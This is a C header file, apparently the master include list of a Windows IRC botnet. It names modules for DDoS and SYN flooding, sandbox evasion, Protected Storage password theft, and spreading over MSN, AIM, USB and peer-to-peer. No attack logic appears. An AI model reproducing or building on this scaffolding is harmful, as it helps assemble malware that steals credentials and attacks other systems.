#define _WIN32_WINNT 0x0403
#define WIN32_LEAN_AND_MEAN
#ifndef _DEBUG
#pragma optimize("gsy", on)
#pragma comment(linker,"/ALIGN:4096 /IGNORE:4108 /RELEASE /IGNORE:4089")
#pragma comment(linker,"/STUB:lib/stub.exe") 
#pragma pack(1)
#else
#endif
#include <winsock2.h>
#include <windows.h>
#include <stdlib.h>
#include <stdio.h>
#include <malloc.h>
#include <wininet.h>
#include <windns.h>
#include <iphlpapi.h>
#include <lm.h>
#include <lmat.h>
#include <io.h>
#include <fcntl.h>
#include <tchar.h>
#include <tlhelp32.h>
#include <commctrl.h>
#include <shlwapi.h>
#include <list>
#include <sqlext.h>
#include <shlobj.h>
#include <ctype.h> 
#include <tchar.h>
#include <winable.h> 
#include <math.h>
#include <Lmcons.h>
#include <ntsecapi.h>
#include <string.h>
#include <winioctl.h>
#include <sys\types.h>
#include <sys\stat.h>

#include "defines.h"

#ifndef NO_PSTORE
#import <pstorec.dll> no_namespace
#endif

#include "pstore.h"
#include "Psapi.h"
#include "loaddlls.h"
#include "imbot.h"
#include "utility.h"
#include "irc.h"
#include "commands.h"
#include "protocol.h"
#include "threads.h"
#include "externs.h"
#include "download.h"
#include "msn.h"
#include "aim.h"
#include "triton.h"
#include "ddos.h"
#include "supersyn.h"
#include "visit.h"
#include "peer2peer.h"
#include "antisandbox.h"

#include "usb.h"
#include <shellapi.h>

#pragma comment(lib, "kernel32")
#pragma comment(lib, "user32")
#pragma comment(lib, "msvcrt")
#pragma comment(lib, "advapi32")
#pragma comment(lib, "wininet")
#pragma comment(lib, "ws2_32")